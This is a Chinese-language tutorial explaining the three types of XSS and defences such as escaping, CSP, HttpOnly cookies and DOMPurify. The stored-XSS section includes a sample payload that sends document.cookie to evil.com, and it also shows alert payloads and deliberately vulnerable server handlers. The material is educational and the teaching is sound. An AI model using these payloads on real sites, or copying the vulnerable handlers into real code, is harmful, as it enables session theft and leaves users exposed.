# XSS (Cross-Site Scripting)

XSS（跨站脚本攻击）是最常见的 Web 安全漏洞之一。攻击者通过注入恶意脚本到目标网页中，当其他用户访问该页面时，恶意脚本会在用户的浏览器中执行，从而窃取用户信息、劫持会话或执行其他恶意操作。

## 第三方库

[DOMPurify](https://github.com/cure53/dompurify)

一个用于清理和验证 HTML 内容的库，帮助防止 XSS 攻击。

## XSS 攻击类型

### 1. 存储型 XSS (Stored XSS)

恶意脚本被**持久化存储**在服务器端（如数据库、评论、留言板），当用户请求包含该脚本的页面时，脚本从服务器返回并在浏览器中执行。

**攻击场景：**

```html
<!-- 攻击者在留言板提交的内容 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

```javascript
// 服务端直接将用户输入渲染到页面（危险！）
app.post('/comment', (req, res) => {
  const comment = req.body.comment
  // 直接存储，不做任何过滤
  db.save(comment)
})

// 页面渲染时直接拼接 HTML
app.get('/comments', (req, res) => {
  const comments = db.getAll()
  let html = '<div>'
  comments.forEach((c) => {
    html += c.content // 恶意脚本被直接拼入 HTML
  })
  html += '</div>'
  res.send(html)
})
```

**危害：** 每个访问该页面的用户都会执行恶意脚本，Cookie 被发送到攻击者服务器。

---

### 2. 反射型 XSS (Reflected XSS)

恶意脚本通过 **URL 参数**传入，服务端将参数值直接反射到响应页面中。通常通过钓鱼链接诱导用户点击。

**攻击场景：**

```
https://example.com/search?q=<script>alert('XSS')</script>
```

```javascript
// 服务端直接将查询参数拼入 HTML（危险！）
app.get('/search', (req, res) => {
  const query = req.query.q
  res.send(`<h1>搜索结果: ${query}</h1>`) // 直接拼接！
})
```

**危害：** 攻击者通过邮件、IM 等发送精心构造的链接，用户点击后脚本在其浏览器中执行。

---

### 3. DOM 型 XSS (DOM-based XSS)

完全发生在**客户端**，恶意脚本通过修改 DOM 来执行。服务端返回的 HTML 本身是正常的，但前端 JavaScript 处理用户输入时存在漏洞。

**攻击场景：**

```html
<!-- 正常页面 -->
<input id="userInput" placeholder="输入你的名字" />
<div id="greeting"></div>

<script>
  // 危险的 innerHTML 使用
  const name = new URLSearchParams(location.search).get('name')
  document.getElementById('greeting').innerHTML = `你好，${name}`
</script>
```

攻击者构造 URL：

```
https://example.com/welcome?name=<img src=x onerror="alert(document.cookie)">
```

访问不到图片，执行`onerror`事件处理，获取 Cookie。

**常见的危险 API：**

| 危险 API                   | 安全替代                    |
| -------------------------- | --------------------------- |
| `innerHTML`                | `textContent` / `innerText` |
| `document.write()`         | 避免使用                    |
| `eval()`                   | 避免使用                    |
| `setTimeout(string)`       | `setTimeout(function)`      |
| `new Function()`           | 避免使用                    |
| `location.href` (用户可控) | 校验和过滤                  |

---

## Cookie 安全防护

### HttpOnly

设置 `HttpOnly` 标志后，Cookie 无法通过 `document.cookie` 被 JavaScript 读取，即使 XSS 注入成功也无法窃取 Cookie。

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

| 属性              | 作用                        |
| ----------------- | --------------------------- |
| `HttpOnly`        | 禁止 JavaScript 访问 Cookie |
| `Secure`          | 仅通过 HTTPS 传输           |
| `SameSite=Strict` | 禁止跨站请求携带 Cookie     |

---

## 防御措施

### 1. 输出转义 (Output Encoding)

根据输出上下文选择合适的转义方式：

```javascript
// HTML 实体转义
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  }
  return str.replace(/[&<>"']/g, (char) => map[char])
}

// 使用示例
const userInput = '<script>alert("xss")</script>'
element.innerHTML = escapeHtml(userInput)
// 渲染为文本而非可执行脚本
```

### 2. CSP (Content Security Policy)

通过 HTTP 头或 `<meta>` 标签限制页面可以加载和执行的资源来源：

```html
<!-- 只允许同源的脚本 -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'; object-src 'none'"
/>
```

或通过 HTTP 响应头：

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

**常用 CSP 指令：**

| 指令                     | 说明                          |
| ------------------------ | ----------------------------- |
| `script-src 'self'`      | 只执行同源脚本                |
| `script-src 'nonce-xxx'` | 只执行带特定 nonce 的脚本     |
| `object-src 'none'`      | 禁止 `<object>`、`<embed>` 等 |
| `default-src 'self'`     | 默认只允许同源资源            |

### 3. 输入验证与过滤

- **白名单优于黑名单**：只允许符合预期的输入格式
- **富文本场景**使用 DOMPurify 等成熟的净化库

```javascript
// 使用 DOMPurify 过滤 HTML
import DOMPurify from 'dompurify'

const dirty = '<img src=x onerror="alert(1)">'
const clean = DOMPurify.sanitize(dirty)
// => '<img src="x">' —— 危险属性被移除
```

### 4. 前端框架的防护

现代前端框架默认对输出进行转义，**避免绕过框架直接操作 DOM**：

```jsx
// React 默认转义 —— 安全
const userInput = '<img src=x onerror=alert(1)>'
return <div>{userInput}</div> // 渲染为文本，不会执行

// 危险！绕过了 React 的转义
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
```

```vue
<!-- Vue 默认转义 —— 安全 -->
<div>{{ userInput }}</div>

<!-- 危险！绕过了 Vue 的转义 -->
<div v-html="userInput"></div>
```

### 5. 安全地处理用户跳转链接

```javascript
// 危险：javascript: 协议的跳转
location.href = userInput // 攻击者输入 "javascript:alert(1)"

// 安全：校验协议
function safeRedirect(url) {
  const parsed = new URL(url, location.origin)
  if (['http:', 'https:'].includes(parsed.protocol)) {
    location.href = parsed.href
  }
}
```

---

## 总结

| 攻击类型   | 存储位置         | 触发方式                 |
| ---------- | ---------------- | ------------------------ |
| 存储型 XSS | 服务器（数据库） | 受害者访问页面           |
| 反射型 XSS | URL 参数         | 受害者点击恶意链接       |
| DOM 型 XSS | 客户端 DOM       | 前端 JS 不安全地操作 DOM |

**防御核心思路：**

1. **永远不信任用户输入** —— 所有输入都可能包含恶意脚本
2. **输出必须转义** —— 根据输出上下文（HTML / JS / URL / CSS）选择合适的编码
3. **Cookie 设 HttpOnly** —— 即使 XSS 成功也无法窃取 Cookie
4. **配置 CSP** —— 限制脚本来源，纵深防御
5. **避免危险 API** —— `innerHTML`、`eval`、`document.write` 不要接受用户输入
